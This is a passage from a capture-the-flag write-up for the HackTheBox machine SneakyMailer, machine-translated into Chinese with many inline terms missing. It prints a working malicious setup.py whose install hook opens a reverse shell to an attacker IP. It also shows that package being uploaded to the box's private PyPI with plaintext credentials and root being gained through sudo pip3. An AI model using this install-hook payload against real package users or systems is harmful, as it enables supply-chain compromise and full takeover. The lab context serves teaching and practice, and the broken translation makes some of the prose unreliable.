恶意代码将进入 。实际上，我以前在[Canape](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#sudo-pip)中创建了一个恶意的。来自Linode的教程显示了合法的样子。它基本上使用一堆关于包的元数据进行调用。[此GitHub](https://github.com/mschwager/0wned)显示了如何添加恶意部分（尽管在上下文中而不是在包中，但它是相同的）。`setup.py``setup.py``setup.py``setup``sudo pip`

默认情况下，具有一些由 和 知道的命令，如 、等。我可以使用参数来传递命令字典，其中包含用于它们的类。该类应具有一个方法，该方法将运行。因为我期望这种交互立即发生，所以我只会让函数成为一个反向外壳：`setup``pip``setup.py``install``uninstall``list,``cmdclass``setup``run``run`

    import os
    import socket
    import subprocess
    from setuptools import setup
    from setuptools.command.install import install
    
    class Exploit(install):
        def run(self):
            RHOST = '10.10.14.42'
            RPORT = 443
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((RHOST, RPORT))
            for i in range(3):
                os.dup2(s.fileno(), i)
            p = subprocess.call(["/bin/sh","-i"])
    
    setup(name='revshell',
          version='0.0.1',
          description='Reverse Shell',
          author='0xdf',
          author_email='0xdf',
          url='http://sneakycopy.htb',
          license='MIT',
          zip_safe=False,
          cmdclass={'install': Exploit})
    

### 打包和上传

#### 本地套餐

要创建一个包，我可以进入包含的目录，然后使用以下命令运行它：`revshell``setup.py``sdist`

    root@kali# python setup.py sdist
    running sdist
    running egg_info
    writing revshell.egg-info/PKG-INFO
    writing top-level names to revshell.egg-info/top_level.txt
    writing dependency_links to revshell.egg-info/dependency_links.txt
    reading manifest file 'revshell.egg-info/SOURCES.txt'
    writing manifest file 'revshell.egg-info/SOURCES.txt'
    running check
    creating revshell-0.0.1
    creating revshell-0.0.1/revshell.egg-info
    copying files to revshell-0.0.1...
    copying README.md -> revshell-0.0.1
    copying setup.cfg -> revshell-0.0.1
    copying setup.py -> revshell-0.0.1
    copying revshell.egg-info/PKG-INFO -> revshell-0.0.1/revshell.egg-info
    copying revshell.egg-info/SOURCES.txt -> revshell-0.0.1/revshell.egg-info
    copying revshell.egg-info/dependency_links.txt -> revshell-0.0.1/revshell.egg-info
    copying revshell.egg-info/not-zip-safe -> revshell-0.0.1/revshell.egg-info
    copying revshell.egg-info/top_level.txt -> revshell-0.0.1/revshell.egg-info
    Writing revshell-0.0.1/setup.cfg
    Creating tar archive
    removing 'revshell-0.0.1' (and everything under it)
    

现在目录中有一个存档：`dist`

    root@kali# ls -l dist/
    total 4
    -rwxrwx--- 1 root vboxsf 943 Jul 13 07:10 revshell-0.0.1.tar.gz
    

#### 远程派普

要打包远程 PyPI，我将创建 ，在其中定义服务器，包括身份验证：`~/.pypirc`

    [distutils]
    index-servers =
      sneaky
    [sneaky]
    repository: http://pypi.sneakycorp.htb:8080
    username: pypi
    password: soufianeelhaoui
    

现在我可以使用命令运行以上传到此服务器。实际上，需要创建包并在同一运行中上传它。如果我只是尝试，它会抱怨：`setup.py``upload``upload`

    root@kali# python setup.py upload -r sneaky
    running upload
    error: Must create and upload files in one command (e.g. setup.py sdist upload)
    

但是，如果我 和 ，它的工作原理：`sdist``upload`

    root@kali# python setup.py sdist upload -r sneaky
    running sdist
    running egg_info
    writing revshell.egg-info/PKG-INFO
    writing top-level names to revshell.egg-info/top_level.txt
    writing dependency_links to revshell.egg-info/dependency_links.txt
    reading manifest file 'revshell.egg-info/SOURCES.txt'
    writing manifest file 'revshell.egg-info/SOURCES.txt'
    running check
    creating revshell-0.0.1
    creating revshell-0.0.1/revshell.egg-info
    copying files to revshell-0.0.1...
    copying README.md -> revshell-0.0.1
    copying setup.cfg -> revshell-0.0.1
    copying setup.py -> revshell-0.0.1
    copying revshell.egg-info/PKG-INFO -> revshell-0.0.1/revshell.egg-info
    copying revshell.egg-info/SOURCES.txt -> revshell-0.0.1/revshell.egg-info
    copying revshell.egg-info/dependency_links.txt -> revshell-0.0.1/revshell.egg-info
    copying revshell.egg-info/not-zip-safe -> revshell-0.0.1/revshell.egg-info
    copying revshell.egg-info/top_level.txt -> revshell-0.0.1/revshell.egg-info
    Writing revshell-0.0.1/setup.cfg
    Creating tar archive
    removing 'revshell-0.0.1' (and everything under it)
    running upload
    Submitting dist/revshell-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080
    Server response (200): OK
    

如果我匆忙加载，则列出包：`http://pypi.sneakycorp.htb:8080/simple`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200713071533459.png) 

它消失得非常快（似乎低是快速反应和清理）。但几秒钟后，接收到与 shell 的连接为低：`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.197.
    Ncat: Connection from 10.10.10.197:56400.
    $ id
    uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),119(pypi-pkg)
    

和低可以访问：`user.txt`

    $ cat user.txt
    13164fcd************************
    

## Priv：低>根

### 列举

列出低级命令可以像其他用户一样运行，非常清楚地显示下一步：`sudo -l`

    low@sneakymailer:/$ sudo -l
    sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
    Matching Defaults entries for low on sneakymailer:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
    User low may run the following commands on sneakymailer:
        (root) NOPASSWD: /usr/bin/pip3
    

### 苏多皮普

这与[Canape](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#sudo-pip)相同，实际上，与上一步相同，只是简单得多。我将使用 Python 的 Web 服务器来托管包中的文件，并在 SneakyMailer 上使用在 中保存副本。`setup.py``wget``/dev/shm`

然后，我只需使用传递当前目录的命令运行：`install`

    low@sneakymailer:/dev/shm$ sudo pip3 install .
    sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
    Processing /dev/shm
    Building wheels for collected packages: revshell
      Running setup.py bdist_wheel for revshell ... -
    

它挂在这里，但在听众那里有一个根壳：`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.197.
    Ncat: Connection from 10.10.10.197:57612.
    # id  
    uid=0(root) gid=0(root) groups=0(root)
    

我可以抓住：`root.txt`

    # cat root.txt
    19eb3f51************************
    

## 超越根

这个盒子里_有大量的_自动化。我不打算全部介绍，但我建议你这样做（在退休后的前两周，免费用户仍然可以使用它）。有一个文件夹，其中包含每个用户运行的脚本：

    root@sneakymailer:/opt/scripts# find . -type f
    ./vmail/imap-user-login.py        <-- send POST to links
    ./vmail/restore-sent-mail-box.py  <-- keep only two messages in mailbox
    ./low/install-module.sh           <-- runs python $1 install
    ./low/install-modules.py          <-- checks for packages, downloads, calls install-module.sh, cleans up
    ./developer/clean-ftp.py          <-- removes webshells and other uploads
    

这些脚本做得很好，值得一读。

我发现有趣并想在这里强调的是它们的运行_方式_。我检查了 crons 和系统计时器，没有它们的迹象。我会在流程列表中看到vmail和开发人员都总是有流程，但没有父流程像无限循环中的脚本一样。`sleep`

事实证明，盒子作者以一种聪明的方式使用服务来制作这些周期性脚本。每个服务在 中定义：`/etc/systemd/system`

    root@sneakymailer:/etc/systemd/system# find . -name '*.service'
    ./getty.target.wants/getty@tty1.service
    ./bot-imap-user.service                   # Automation service
    ./dbus-org.freedesktop.timesync1.service
    ./install-modules.service                 # Automation service
    ./network-online.target.wants/networking.service
    ./sysinit.target.wants/systemd-timesyncd.service
    ./sysinit.target.wants/apparmor.service
    ./sysinit.target.wants/keyboard-setup.service
    ./clean-ftp.service                       # Automation service
    ./dbus-fi.w1.wpa_supplicant1.service
    ./bluetooth.target.wants/bluetooth.service
    ./dbus-org.bluez.service
    ./sshd.service
    ...[snip]...
    ./syslog.service
    ./open-vm-tools.service.requires/vgauth.service
    ./restore-sent-mail-box.service           # Automation service
    ./pypi.service
    

对于需要定期运行的每个服务，作者将使用，以便在服务完成时，它只是再次启动，并且通常包括 以分隔执行。例如：`Restart=always``ExecStartPre=/bin/sleep 10``bot-imap-user.service`

    [Unit]
    After=network.target
    
    [Service]
    Type=simple
    Restart=always
    User=vmail
    ExecStartPre=/bin/sleep 10
    ExecStart=/home/vmail/venv/bin/python /opt/scripts/vmail/imap-user-login.py
    
    [Install]
    WantedBy=multi-user.target
    

有四种为鬼鬼祟祟的邮件编写的自动化服务：

服务

用户

脚本（在 /opt/脚本中）

睡

笔记

`bot-imap-user`

邮箱

`vmail/imap-user-login.py`

301

阅读邮件，“点击”网络钓鱼

`install-modules`

低

`low/install-modules.py`

301

下载模块并运行

`clean-ftp`

开发 人员

`developer/clean-ftp.py`

60

从开发 Web 服务器中删除文件

`restore-sent-mail-box`

邮箱

`vmail/restore-sent-mail-box.py`

10

重置邮箱

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html)